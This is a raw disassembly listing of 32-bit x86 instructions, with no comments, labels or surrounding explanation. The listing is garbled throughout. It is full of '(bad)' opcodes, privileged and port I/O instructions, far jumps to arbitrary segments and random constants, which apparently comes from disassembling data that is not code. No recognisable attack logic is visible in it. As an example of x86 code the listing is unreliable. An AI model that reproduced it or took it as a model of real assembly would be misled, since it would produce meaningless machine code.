  40a45d:	xchg   ebp,eax
  40a45e:	push   ecx
  40a45f:	in     al,dx
  40a460:	xor    DWORD PTR [edx+0x3d6ed3d9],ebp
  40a466:	(bad)  
  40a467:	mov    ah,0x3f
  40a469:	add    edi,DWORD PTR [ebp-0x1c]
  40a46c:	push   es
  40a46d:	pop    ebp
  40a46e:	sub    bh,BYTE PTR [ecx]
  40a470:	mov    ecx,0x38c035e
  40a475:	xor    ecx,DWORD PTR [edx+0x6]
  40a478:	mul    DWORD PTR [ecx+0xe369422]
  40a47e:	mov    dh,BYTE PTR [edx]
  40a480:	sub    dh,al
  40a482:	xchg   ecx,eax
  40a483:	jns    0x40a459
  40a485:	fld    DWORD PTR fs:[edx+0xae71400]
  40a48c:	hlt    
  40a48d:	push   es
  40a48e:	cmp    BYTE PTR [ecx+0x57606521],cl
  40a494:	shl    BYTE PTR ds:0x24bbe733,cl
  40a49a:	mov    eax,ds:0xbf865b35
  40a49f:	cli    
  40a4a0:	mov    bh,0xd1
  40a4a2:	cmp    eax,0x348f7200
  40a4a7:	pop    edi
  40a4a8:	stos   BYTE PTR es:[edi],al
  40a4a9:	xor    ah,ch
  40a4ab:	cmp    ecx,DWORD PTR [edi+0x7f]
  40a4ae:	retf   0x632d
  40a4b1:	adc    eax,0x917ea26
  40a4b6:	push   es
  40a4b7:	xchg   DWORD PTR [ebp-0x5c],ebp
  40a4ba:	ret    
  40a4bb:	ror    BYTE PTR [esp+ebx*8],0xf2
  40a4bf:	mov    ah,0xa4
  40a4c1:	and    edi,DWORD PTR [edi]
  40a4c3:	adc    eax,0x979f58c4
  40a4c8:	xchg   ebx,eax
  40a4c9:	xchg   ebx,eax
  40a4ca:	jne    0x40a51d
  40a4cc:	pop    esp
  40a4cd:	rol    DWORD PTR [esi-0x26],cl
  40a4d0:	repz mov ebp,0xec092847
  40a4d6:	rol    esi,1
  40a4d8:	daa    
  40a4d9:	fcmovb st,st(6)
  40a4db:	lods   ax,WORD PTR es:[esi]
  40a4de:	dec    ecx
  40a4df:	push   edi
  40a4e0:	jnp    0x40a524
  40a4e2:	lea    edx,[ecx+0x66ea19b1]
  40a4e8:	loope  0x40a471
  40a4ea:	neg    bh
  40a4ec:	aaa    
  40a4ed:	scas   al,BYTE PTR es:[di]
  40a4ef:	or     DWORD PTR ds:0x296dad38,esi
  40a4f5:	xchg   ebp,eax
  40a4f6:	sbb    ebx,DWORD PTR [eax+0x1f2a2b33]
  40a4fc:	fnstenv [eax+edi*4]
  40a4ff:	ffree  st(2)
  40a501:	inc    esi
  40a502:	and    edx,edi
  40a504:	popa   
  40a505:	ins    BYTE PTR es:[edi],dx
  40a506:	int    0x1e
  40a508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a509:	dec    esp
  40a50a:	call   0x83182fc8
  40a50f:	in     eax,dx
  40a510:	mov    ds:0xb90f1138,al
  40a515:	loopne 0x40a592
  40a517:	repz fist WORD PTR [esi+edi*4-0x3af25a4d]
  40a51f:	mov    dh,0x28
  40a521:	lods   eax,DWORD PTR ds:[esi]
  40a522:	xchg   edi,ecx
  40a524:	ret    
  40a525:	or     dh,BYTE PTR [esi+0x3a04e811]
  40a52b:	adc    al,BYTE PTR [ebx-0x1e]
  40a52e:	in     eax,0xb5
  40a530:	(bad)  
  40a531:	adc    dl,BYTE PTR [ebp-0x5f]
  40a534:	stos   DWORD PTR es:[edi],eax
  40a535:	daa    
  40a536:	xchg   edi,eax
  40a537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a538:	mov    cl,0x32
  40a53a:	xchg   esp,eax
  40a53b:	ds ret 
  40a53d:	jns    0x40a51b
  40a53f:	mov    WORD PTR [edi],?
  40a541:	test   al,0xaf
  40a543:	icebp  
  40a544:	scas   al,BYTE PTR es:[edi]
  40a545:	sbb    eax,0x25de4197
  40a54a:	mov    ah,0x8c
  40a54c:	inc    edi
  40a54d:	or     ebp,DWORD PTR ds:0xeff8ef81
  40a553:	jae    0x40a5b5
  40a555:	cld    
  40a556:	sahf   
  40a557:	es (bad) 
  40a559:	imul   edi,esp,0xa8849b92
  40a55f:	mov    esi,0x735ccd4a
  40a564:	jp     0x40a514
  40a566:	xor    esp,DWORD PTR [edx-0x1d]
  40a569:	ins    DWORD PTR es:[edi],dx
  40a56a:	or     eax,0xd71f847b
  40a56f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a570:	push   es
  40a571:	fucomp st(1)
  40a573:	lea    ebx,[edi+eax*2]
  40a576:	cmp    esp,esi
  40a578:	push   ecx
  40a579:	cdq    
  40a57a:	mov    cl,0xb2
  40a57c:	pop    ds
  40a57d:	xor    esp,0xffffff95
  40a580:	out    0x7,eax
  40a582:	mov    edi,0x152cd083
  40a587:	les    edi,FWORD PTR [ebx]
  40a589:	cld    
  40a58a:	jmp    0xb803:0xcc20f9a7
  40a591:	jle    0x40a5a9
  40a593:	scas   eax,DWORD PTR es:[edi]
  40a594:	push   eax
  40a595:	or     BYTE PTR [eax+0x27279671],ah
  40a59b:	loop   0x40a5bf
  40a59d:	inc    eax
  40a59e:	push   0x7f
  40a5a0:	aad    0xf1
  40a5a2:	repz (bad) 
  40a5a4:	fild   WORD PTR [esi+eiz*4]
  40a5a7:	push   esi
  40a5a8:	mov    ch,0x62
  40a5aa:	loop   0x40a5b3
  40a5ac:	mov    bl,0x29
  40a5ae:	xchg   ecx,eax
  40a5af:	rcr    ebx,0x4
  40a5b2:	mov    eax,DWORD PTR gs:[eax-0x59511dbb]
  40a5b9:	loope  0x40a566
  40a5bb:	push   edi
  40a5bc:	stos   DWORD PTR es:[edi],eax
  40a5bd:	nop
  40a5be:	ficomp WORD PTR [ebx]
  40a5c0:	xor    eax,0x8b37be10
  40a5c5:	jns    0x40a595
  40a5c7:	and    bh,BYTE PTR [ecx+0x27de7e29]
  40a5cd:	sti    
  40a5ce:	inc    ebp
  40a5cf:	sbb    al,0x4b
  40a5d1:	pop    ecx
  40a5d2:	sti    
  40a5d3:	mov    cs,WORD PTR [ebp-0x78d91912]
  40a5d9:	lods   eax,DWORD PTR ds:[esi]
  40a5da:	or     BYTE PTR [ebp-0x6a],cl
  40a5dd:	push   esi
  40a5de:	dec    eax
  40a5df:	mov    ds:0x47459c39,al
  40a5e4:	repz sbb BYTE PTR [ecx+0x5a2e198b],bh
  40a5eb:	xchg   edx,eax
  40a5ec:	fnstcw WORD PTR [ebx]
  40a5ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5ef:	repz std 
  40a5f1:	popf   
  40a5f2:	shl    BYTE PTR [ecx],0x49
  40a5f5:	daa    
  40a5f6:	jmp    0xda6c:0xadab5e6c
  40a5fd:	inc    ebx
  40a5fe:	hlt    
  40a5ff:	xchg   esp,eax
  40a600:	push   ds
  40a601:	and    BYTE PTR [edi+0x6],dh
  40a604:	imul   esi,DWORD PTR [edx-0x5198138c],0x3b112504
  40a60e:	int3   
  40a60f:	test   DWORD PTR [ebx-0x5a],edx
  40a612:	cmc    
  40a613:	inc    esi
  40a614:	neg    DWORD PTR [edx]
  40a616:	adc    eax,DWORD PTR [ebx]
  40a618:	pop    es
  40a619:	sub    DWORD PTR [edx],eax
  40a61b:	xor    eax,0xe63f9fc5
  40a620:	mov    ebx,DWORD PTR [edx+esi*1-0x292003c0]
  40a627:	test   eax,0x91c29ad5
  40a62c:	sub    bl,BYTE PTR [ebp+0x6d]
  40a62f:	mov    edi,0xeee397ab
  40a634:	push   es
  40a635:	sub    al,0x6d
  40a637:	push   ebx
  40a638:	push   0x9
  40a63a:	xor    eax,0x66d49a15
  40a63f:	pop    di
  40a641:	push   ecx
  40a642:	push   ecx
  40a643:	stos   DWORD PTR es:[edi],eax
  40a644:	sbb    BYTE PTR [ecx-0x34e83246],cl
  40a64a:	sub    dh,BYTE PTR [edi-0x3c]
  40a64d:	xchg   edx,eax
  40a64e:	in     al,dx
  40a64f:	outs   dx,BYTE PTR ds:[esi]
  40a650:	ja     0x40a662
  40a652:	lahf   
  40a653:	mov    ch,0x6
  40a655:	stos   BYTE PTR es:[edi],al
  40a656:	mov    esp,0xaedcce4c
  40a65b:	lds    eax,FWORD PTR [eax+0x11b4300b]
  40a661:	fucomip st,st(1)
  40a663:	dec    esi
  40a664:	or     BYTE PTR [ebx+esi*2-0xcd81826],ch
  40a66b:	pushf  
  40a66c:	into   
  40a66d:	gs repnz sti 
  40a670:	sub    bl,bh
  40a672:	fwait
  40a673:	xchg   DWORD PTR [ecx-0x2017a8e9],ecx
  40a679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a67a:	or     BYTE PTR [ebx],0x2c
  40a67d:	sbb    eax,0x358db811
  40a682:	and    eax,0x7f6af0ee
  40a687:	or     al,0xa0
  40a689:	adc    bh,BYTE PTR [edi-0x5fb8d698]
  40a68f:	and    BYTE PTR [ebp+0x59dc880],0x75
  40a696:	xchg   esp,eax
  40a697:	lahf   
  40a698:	ret    0xfb40
  40a69b:	xchg   ecx,eax
  40a69c:	cmp    edx,edi
  40a69e:	pop    es
  40a69f:	leave  
  40a6a0:	adc    al,0xf3
  40a6a2:	adc    eax,0x17d78e9e
  40a6a7:	sub    ecx,0x2b894251
  40a6ad:	imul   ebp,DWORD PTR [eax-0x127a999e],0xd19e16be
  40a6b7:	in     eax,dx
  40a6b8:	cs scas eax,DWORD PTR es:[edi]
  40a6ba:	mov    bl,0x59
  40a6bc:	les    ebp,FWORD PTR [edx-0x7e]
  40a6bf:	xchg   edx,eax
  40a6c0:	xchg   ebx,eax
  40a6c1:	aaa    
  40a6c2:	jnp    0x40a6df
  40a6c4:	into   
  40a6c5:	fimul  WORD PTR [edi]
  40a6c7:	mov    eax,ebx
  40a6c9:	cmc    
  40a6ca:	jmp    0x34484a48
  40a6cf:	test   DWORD PTR [esi-0x24d0559c],edi
  40a6d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6d6:	(bad)  
  40a6d7:	into   
  40a6d8:	adc    eax,DWORD PTR ds:0xe9c703c9
  40a6de:	sbb    al,0x3
  40a6e0:	add    BYTE PTR [eax],al
  40a6e2:	in     eax,0x96
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4+0x4f]
  40a6ef:	fwait
  40a6f0:	mov    edi,0x7ee97823
  40a6f5:	jle    0x40a771
  40a6f7:	jge    0x40a777
  40a6f9:	jle    0x40a6e1
  40a6fb:	pop    eax
  40a6fc:	xchg   BYTE PTR [ebx-0xda5c6ca],ch
  40a702:	xchg   BYTE PTR [edi+eiz*2+0x3d],ah
  40a706:	inc    edx
  40a707:	pop    edx
  40a708:	in     eax,dx
  40a709:	shl    BYTE PTR [edx],cl
  40a70b:	mov    BYTE PTR [ebx+0x43],ah
  40a70e:	sbb    BYTE PTR [ecx-0x1af61466],al
  40a714:	mov    cs,WORD PTR [ebx]
  40a716:	adc    al,0xe4
  40a718:	mov    esp,0x5ca81e72
  40a71d:	repnz pop esi
  40a71f:	pop    ds
  40a720:	js     0x40a77e
  40a722:	in     eax,dx
  40a723:	lods   al,BYTE PTR ds:[esi]
  40a724:	rep movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  40a727:	and    DWORD PTR [esi-0x5edeb73d],ebx
  40a72d:	pop    ebx
  40a72e:	test   eax,0x70d62884
  40a733:	icebp  
  40a734:	pop    edx
  40a735:	ret    
  40a736:	outs   dx,BYTE PTR ds:[esi]
  40a737:	jns    0x40a75d
  40a739:	scas   eax,DWORD PTR es:[edi]
  40a73a:	inc    edi
  40a73b:	fwait
  40a73c:	popa   
  40a73d:	fmul   DWORD PTR [edx]
  40a73f:	xchg   ebx,eax
  40a740:	xchg   esp,eax
  40a741:	bound  ebp,QWORD PTR [edi+ecx*2-0x235cf61a]
  40a748:	adc    al,0xad
  40a74a:	out    0x6c,eax
  40a74c:	aam    0x59
  40a74e:	mov    ebp,0x71ce1230
  40a753:	dec    esi
  40a754:	mov    esp,0x2c53a7f9
  40a759:	lods   eax,DWORD PTR ds:[esi]
  40a75a:	stos   DWORD PTR es:[edi],eax
  40a75b:	rol    bh,cl
  40a75d:	in     eax,0x80
  40a75f:	retf   
  40a760:	es clc 
  40a762:	aas    
  40a763:	inc    esi
  40a764:	cmp    BYTE PTR [edi],0xc2
  40a767:	fistp  DWORD PTR [ebx-0x47]
  40a76a:	add    edx,DWORD PTR [ebp+0x21]
  40a76d:	fsubr  DWORD PTR ds:0x39e047a1
  40a773:	push   cs
  40a774:	mov    ecx,0x624d8229
  40a779:	(bad)  
  40a77a:	sub    al,0x98
  40a77c:	rcr    DWORD PTR [esi+0x64],0xa8
  40a780:	adc    DWORD PTR [esi-0x42],esp
  40a783:	addr16 add al,0x5a
  40a786:	ror    BYTE PTR [esi],cl
  40a788:	dec    ecx
  40a789:	sbb    BYTE PTR ds:0x4463d240,0x3a
  40a790:	push   ss
  40a791:	mov    DWORD PTR [edi-0x67],ecx
  40a794:	std    
  40a795:	lods   al,BYTE PTR ds:[esi]
  40a796:	loopne 0x40a7ee
  40a798:	sub    al,BYTE PTR [ecx+eax*4-0x25763074]
  40a79f:	or     al,0x9e
  40a7a1:	mov    BYTE PTR ds:0x43eb8774,dl
  40a7a7:	mov    esi,DWORD PTR [ebx-0x6d]
  40a7aa:	jns    0x40a7d2
  40a7ac:	nop
  40a7ad:	add    bh,BYTE PTR [eax]
  40a7af:	or     dh,BYTE PTR [ecx+0x64abfd41]
  40a7b5:	push   eax
  40a7b6:	dec    ebx
  40a7b7:	sbb    edi,0x66aa18ac
  40a7bd:	hlt    
  40a7be:	imul   eax,DWORD PTR [edi-0x79],0xfffffff8
  40a7c2:	idiv   DWORD PTR [edx]
  40a7c4:	ds mov bh,0xea
  40a7c7:	stc    
  40a7c8:	push   ds
  40a7c9:	cli    
  40a7ca:	sbb    esp,ecx
  40a7cc:	outs   dx,BYTE PTR ds:[esi]
  40a7cd:	cmp    eax,0x69928dcf
  40a7d2:	rcl    BYTE PTR [edx],cl
  40a7d4:	xchg   ebx,eax
  40a7d5:	pop    eax
  40a7d6:	(bad)  
  40a7d8:	jle    0x40a7bd
  40a7da:	and    ecx,DWORD PTR [ebx+0x1f]
  40a7dd:	mov    cl,dh
  40a7df:	arpl   WORD PTR [ebx],cx
  40a7e1:	xor    DWORD PTR [esi+edx*2-0x1e69e8f3],0x72
  40a7e9:	mov    edi,0xe9d7030f
  40a7ee:	jae    0x40a809
  40a7f0:	sub    eax,0xfe5b60d1
  40a7f5:	or     dh,dl
  40a7f7:	lods   al,BYTE PTR ds:[esi]
  40a7f8:	rol    ebp,0xc3
  40a7fb:	and    bh,BYTE PTR [esi+0xa]
  40a7fe:	sbb    DWORD PTR [edi-0x6b],esi
  40a801:	stos   DWORD PTR es:[edi],eax
  40a802:	xor    BYTE PTR [eax-0x3ef673b4],ah
  40a808:	pop    edi
  40a809:	fistp  WORD PTR [ecx]
  40a80b:	xchg   esi,eax
  40a80c:	loop   0x40a87b
  40a80e:	mov    es,WORD PTR [esi-0x79ea25ea]
  40a814:	or     DWORD PTR [edi+0x526c09e0],esi
  40a81a:	addr16 retf 
  40a81c:	or     DWORD PTR [bx+di],esi
  40a81f:	inc    ebx
  40a820:	and    BYTE PTR [esi],dl
  40a822:	lahf   
  40a823:	stos   DWORD PTR es:[edi],eax
  40a824:	inc    esi
  40a825:	out    dx,al
  40a826:	push   ecx
  40a827:	adc    al,0x1
  40a829:	sbb    esp,DWORD PTR [ecx+0x40]
  40a82c:	jne    0x40a80b
  40a82e:	fnstsw WORD PTR [edx+0x59618947]
  40a834:	dec    ebx
  40a835:	sbb    al,0x2d
  40a837:	fstp   QWORD PTR [esi+0x773a7209]
  40a83d:	mov    esi,0xfe7f14ce
  40a842:	daa    
  40a843:	bound  eax,QWORD PTR [ecx-0x5a722817]
  40a849:	fbld   TBYTE PTR [esi-0x7c]
  40a84c:	shl    dh,0x88
  40a84f:	rol    DWORD PTR [edx+0x393245c3],1
  40a855:	fadd   DWORD PTR [eax+ebx*1-0x29]
  40a859:	dec    edi
  40a85a:	jno    0x40a8bb
  40a85c:	jns    0x40a8be
  40a85e:	xchg   edx,eax
  40a85f:	test   al,0x34
  40a861:	fsubrp st(3),st
  40a863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a864:	cli    
  40a865:	loopne 0x40a862
  40a867:	and    edx,ebp
  40a869:	inc    esi
  40a86a:	dec    esp
  40a86b:	sti    
  40a86c:	xchg   esi,eax
  40a86d:	mov    ds:0x606bab0,eax
  40a872:	das    
  40a873:	xchg   edx,eax
  40a874:	into   
  40a875:	push   0xfffffff3
  40a877:	pop    edi
  40a878:	mov    dl,0x48
  40a87a:	inc    esp
  40a87b:	mov    bh,0x14
  40a87d:	ret    
  40a87e:	push   edi
  40a87f:	lods   al,BYTE PTR ds:[esi]
  40a880:	mov    ch,BYTE PTR [ebx]
  40a882:	push   ebp
  40a883:	mov    BYTE PTR [edi+0x4feab6ad],0xe0
  40a88a:	scas   al,BYTE PTR es:[edi]
  40a88b:	div    BYTE PTR [edx]
  40a88d:	cmp    DWORD PTR [ebx+0x6ad1806e],edx
  40a893:	adc    bp,WORD PTR [ecx+0x276a33ec]
  40a89a:	pop    ecx
  40a89b:	sub    DWORD PTR [ecx+0x37],0x68fa9233
  40a8a2:	fdiv   DWORD PTR [ecx+0x2c008ef5]
  40a8a8:	and    BYTE PTR [ebx+0x9],dl
  40a8ab:	cmp    ah,BYTE PTR [eax]
  40a8ad:	mov    ecx,0xe7f8df1d
  40a8b2:	mov    ecx,0x7aff04c1
  40a8b7:	retf   0x8de5
  40a8ba:	adc    DWORD PTR [ecx-0x39],ebp
  40a8bd:	xchg   ebp,eax
  40a8be:	pop    ds
  40a8bf:	lock fldcw WORD PTR [esi]
  40a8c2:	dec    ebx
  40a8c3:	leave  
  40a8c4:	aas    
  40a8c5:	pusha  
  40a8c6:	es loop 0x40a871
  40a8c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8ca:	call   0x28d11d9e
  40a8cf:	ja     0x40a8bb
  40a8d1:	add    DWORD PTR [esi+0x50],eax
  40a8d4:	ret    0xeef2
  40a8d7:	add    eax,0xbd32c32
  40a8dc:	jmp    0x40a8bb
  40a8de:	ss int 0x88
  40a8e1:	sbb    BYTE PTR [edx+0x637b54d8],dl
  40a8e7:	inc    edi
  40a8e8:	push   ds
  40a8e9:	jle    0x40a91b
  40a8eb:	ja     0x40a8a2
  40a8ed:	mov    ebp,0xce37faa7
  40a8f2:	cmp    DWORD PTR [esi+0x45fe9d64],esi
  40a8f8:	xchg   ebp,eax
  40a8f9:	imul   ebp,DWORD PTR [edi+edi*2-0x63],0xe9d1e2c4
  40a901:	pop    es
  40a902:	mov    al,0x4e
  40a904:	jns    0x40a89f
  40a906:	les    esp,FWORD PTR [eax]
  40a908:	lea    ecx,[edi-0x28b43dd5]
  40a90e:	les    ecx,FWORD PTR [ebx+0x7e11e1cb]
  40a914:	lds    edi,FWORD PTR [eax+0x2a61e4cd]
  40a91a:	rcl    DWORD PTR [esi],1
  40a91c:	add    ecx,DWORD PTR [ecx+0x1cb6a1ec]
  40a922:	and    ah,BYTE PTR [eax+0x71412957]
  40a928:	sub    al,0x1a
  40a92a:	call   0x8f5cad93
  40a92f:	mov    bl,0x65
  40a931:	iret   
  40a932:	outs   dx,BYTE PTR ds:[esi]
  40a933:	jmp    0x41efcb69
  40a938:	push   es
  40a939:	dec    ebx
  40a93a:	adc    cl,BYTE PTR [eax]
  40a93c:	int3   
  40a93d:	clc    
  40a93e:	xchg   esp,eax
  40a93f:	sub    al,0xb7
  40a941:	dec    ebp
  40a942:	lahf   
  40a943:	pmaddwd mm4,QWORD PTR ds:0xe98726c4
  40a94a:	retf   0x79c
  40a94d:	es out 0x27,eax
  40a950:	push   ss
  40a951:	jmp    0x40a9d1
  40a953:	(bad)  
  40a954:	push   0xffffff9e
  40a956:	adc    eax,0x48525b70
  40a95b:	push   edi
  40a95c:	popf   
  40a95d:	jp     0x40a9cd
  40a95f:	mov    ch,BYTE PTR [edx-0xa]
  40a962:	aam    0x98
  40a964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a965:	das    
  40a966:	and    al,0x9d
  40a968:	xchg   DWORD PTR [eax],eax
  40a96a:	jno    0x40a8f6
  40a96c:	dec    edx
  40a96d:	jecxz  0x40a920
  40a96f:	outs   dx,BYTE PTR ds:[esi]
  40a970:	sbb    dh,dl
  40a972:	jo     0x40a943
  40a974:	rol    DWORD PTR [ebp-0x12],1
  40a977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a978:	out    0xad,eax
  40a97a:	mov    si,0x1c35
  40a97e:	fisttp WORD PTR [edi-0x7a]
  40a981:	cmp    ch,bh
  40a983:	mov    esi,0x7d2e40fd
  40a988:	(bad)  [ecx]
  40a98a:	mov    DWORD PTR ds:0xe72a431a,ebx
  40a990:	and    BYTE PTR [edi],0x63
  40a993:	inc    edx
  40a994:	jl     0x40a99b
  40a996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a997:	sub    al,0x3
  40a999:	icebp  
  40a99a:	sbb    dh,BYTE PTR [ebx-0x76]
  40a99d:	mov    ebp,0x520592dd
  40a9a2:	loop   0x40a9cc
  40a9a4:	enter  0x95ee,0x9d
  40a9a8:	pop    es
  40a9a9:	jp     0x40a9d8
  40a9ab:	loop   0x40a9c8
  40a9ad:	mov    esp,DWORD PTR [ecx+eiz*2-0x26]
  40a9b1:	fist   DWORD PTR [eax-0x73591adf]
  40a9b7:	pop    ebx
  40a9b8:	cmp    DWORD PTR [edx],esi
  40a9ba:	adc    bl,BYTE PTR [edx+0x7d]
  40a9bd:	iret   
  40a9be:	loope  0x40a990
  40a9c0:	xchg   esp,eax
  40a9c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9c2:	mov    ebx,0x5fbe1b4d
  40a9c7:	lsl    esi,WORD PTR [edx-0x2d7d6b93]
  40a9ce:	dec    esp
  40a9cf:	xor    ch,bh
  40a9d1:	jbe    0x40a9f7
  40a9d3:	push   eax
  40a9d4:	loop   0x40a9bf
  40a9d6:	mov    esi,0x4096dfe
  40a9db:	push   ebp
  40a9dc:	cmp    ebx,DWORD PTR [ebx+0x57b9cffa]
  40a9e2:	jmp    0x3346:0xbbf7f08d
  40a9e9:	push   edx
  40a9ea:	xchg   esp,eax
  40a9eb:	jbe    0x40aa29
  40a9ed:	sti    
  40a9ee:	ret    0x5664
  40a9f1:	push   ebp
  40a9f2:	test   BYTE PTR [edx+0x245f99],bl
  40a9f8:	jl     0x40a9c9
  40a9fa:	pop    edi
  40a9fb:	inc    edx
  40a9fc:	ins    DWORD PTR es:[edi],dx
  40a9fd:	xchg   BYTE PTR [ecx],bh
  40a9ff:	add    DWORD PTR [edi],ecx
  40aa01:	test   BYTE PTR [edx],ah
  40aa03:	adc    BYTE PTR [eax],al
  40aa05:	add    BYTE PTR [ebx+0x458bec4d],cl
  40aa0b:	clc    
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    DWORD PTR [esi-0x52],ebp
  40aa2b:	jae    0x40aa9d
  40aa2d:	add    al,0xf4
  40aa2f:	jle    0x40aaaf
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	rcr    BYTE PTR [edx-0x47],1
  40aa38:	push   es
  40aa39:	adc    edx,DWORD PTR [edi+0x32]
  40aa3c:	adc    eax,0x27c06f02
  40aa41:	lock add BYTE PTR [ebx],dl
  40aa44:	lds    ebx,FWORD PTR [esi]
  40aa46:	loop   0x40aa32
  40aa48:	jp     0x40aab4
  40aa4a:	repz loop 0x40aa2a
  40aa4d:	cli    
  40aa4e:	cs pop ebx
  40aa50:	jae    0x40aa31
  40aa52:	pop    edx
  40aa53:	push   0x67c3ac0f
  40aa58:	sbb    ch,BYTE PTR ds:0x5ac05a3c
  40aa5e:	aam    0x6c
  40aa60:	repnz pop es
  40aa62:	mov    DWORD PTR [esi-0x4a],0xe49a8280
  40aa69:	rcl    BYTE PTR [esp+edi*8],cl
  40aa6c:	push   edi
  40aa6d:	shl    BYTE PTR ss:[ecx+0x75],cl
  40aa71:	adc    BYTE PTR [esi],dh
  40aa73:	push   edi
  40aa74:	push   ebp
  40aa75:	xchg   edx,eax
  40aa76:	xor    al,0xb2
  40aa78:	bound  esp,QWORD PTR [ebp-0xe]
  40aa7b:	adc    eax,0x418900d2
  40aa80:	cmp    al,0xd1
  40aa82:	mov    BYTE PTR [ecx],al
  40aa84:	sub    DWORD PTR [ecx+0x5ea63d3f],0x38
  40aa8b:	jns    0x40aa21
  40aa8d:	test   al,0xc6
  40aa8f:	mov    bl,0xe0
  40aa91:	dec    ecx
  40aa92:	fcom   QWORD PTR [ecx]
  40aa94:	or     BYTE PTR [eax+0x7],ch
  40aa97:	xor    BYTE PTR [edx+eax*2-0x718ba297],0xfe
  40aa9f:	inc    esp
  40aaa0:	mov    edi,0xfc6fd646
  40aaa5:	adc    eax,0xacca5839
  40aaaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaab:	loop   0x40ab1b
  40aaad:	mov    fs,esi
  40aaaf:	inc    esi
  40aab0:	mov    ecx,0xb99a1749
  40aab5:	out    dx,eax
  40aab6:	btr    DWORD PTR [edi+0x4341e4ad],edi
  40aabd:	adc    ah,BYTE PTR [eax+0x27]
  40aac0:	inc    ecx
  40aac1:	loop   0x40ab10
  40aac3:	outs   dx,DWORD PTR ds:[esi]
  40aac4:	mov    eax,0x8a3a0671
  40aac9:	div    DWORD PTR [ecx]
  40aacb:	pop    ds
  40aacc:	(bad)
  40aad0:	or     ah,BYTE PTR [eax]
  40aad2:	dec    edx
  40aad3:	jge    0x40aae4
  40aad5:	loopne 0x40ab3f
  40aad7:	outs   dx,DWORD PTR ds:[esi]
  40aad8:	pop    esi
  40aad9:	int    0x69
  40aadb:	sbb    esp,esi
  40aadd:	xor    edi,esi
  40aadf:	pop    ss
  40aae0:	aas    
  40aae1:	out    0xe8,eax
  40aae3:	aam    0x6e
  40aae5:	mov    eax,ds:0x3c077f96
  40aaea:	and    edi,DWORD PTR [esp+edi*2+0x78]
  40aaee:	jns    0x40aafb
  40aaf0:	je     0x40aad9
  40aaf2:	lods   eax,DWORD PTR ds:[esi]
  40aaf3:	jmp    FWORD PTR cs:[edx*1+0x30c62042]
  40aafb:	cmp    DWORD PTR [eax+0x1b],ebp
  40aafe:	js     0x40ab4e
  40ab00:	mov    DWORD PTR [ecx-0x23],eax
  40ab03:	out    0x76,al
  40ab05:	repnz inc ebp
  40ab07:	inc    eax
  40ab08:	fdiv   st,st(3)
  40ab0a:	adc    eax,0xc3d4c4ad
  40ab0f:	dec    esp
  40ab10:	jp     0x40ab7a
  40ab12:	xchg   edi,eax
  40ab13:	sbb    al,0xa4
  40ab15:	add    al,0x97
  40ab17:	sub    eax,DWORD PTR [esi]
  40ab19:	jo     0x40aaac
  40ab1b:	(bad)  
  40ab1d:	xchg   ebx,eax
  40ab1e:	stc    
  40ab1f:	push   edx
  40ab20:	(bad)  
  40ab21:	(bad)  
  40ab22:	cwde   
  40ab23:	pop    es
  40ab24:	fsubr  QWORD PTR [eax+ebx*4+0x471d7973]
  40ab2b:	cwde   
  40ab2c:	sbb    BYTE PTR [edi-0x35],ah
  40ab2f:	nop
  40ab30:	(bad)  
  40ab31:	nop
  40ab32:	add    DWORD PTR [edi+0x7d],esp
  40ab35:	fdiv   DWORD PTR [edi]
  40ab37:	xchg   esi,eax
  40ab38:	js     0x40ab11
  40ab3a:	int    0x51
  40ab3c:	adc    ebx,DWORD PTR gs:[edi]
  40ab3f:	pop    ss
  40ab40:	sar    DWORD PTR [esi],1
  40ab42:	or     BYTE PTR [ebx+0x1d311cf8],ah
  40ab48:	aam    0x48
  40ab4a:	call   0x306a39b1
  40ab4f:	and    ebx,esi
  40ab51:	jne    0x40aafa
  40ab53:	inc    esp
  40ab54:	adc    DWORD PTR [ebx+edx*2],0xffffffac
  40ab58:	popf   
  40ab59:	sub    esp,DWORD PTR [edx+0x148233b4]
  40ab5f:	popf   
  40ab60:	inc    ebp
  40ab61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab62:	pop    esi
  40ab63:	mov    esi,0x92e2a58d
  40ab68:	mov    esi,0x292dffa4
  40ab6d:	ss loopne 0x40ab98
  40ab70:	cli    
  40ab71:	pop    edi
  40ab72:	xchg   BYTE PTR [eax],dh
  40ab74:	push   0xa18d5617
  40ab79:	push   0xfffffffc
  40ab7b:	add    BYTE PTR [esp+ebp*2-0x5e8d14c3],ch
  40ab82:	les    ebx,FWORD PTR [edi+0x3d04ac87]
  40ab88:	into   
  40ab89:	loop   0x40ab47
  40ab8b:	inc    eax
  40ab8c:	adc    al,0x85
  40ab8e:	ja     0x40ab6c
  40ab90:	push   ebx
  40ab91:	lahf   
  40ab92:	(bad)  
  40ab93:	call   0x7914:0xce1619d
  40ab9a:	aam    0xc0
  40ab9c:	push   si
  40ab9e:	push   ss
  40ab9f:	jns    0x40ab58
  40aba1:	(bad)  
  40aba2:	stos   BYTE PTR es:[edi],al
  40aba3:	in     al,dx
  40aba4:	out    dx,al
  40aba5:	xor    DWORD PTR [edx],ecx
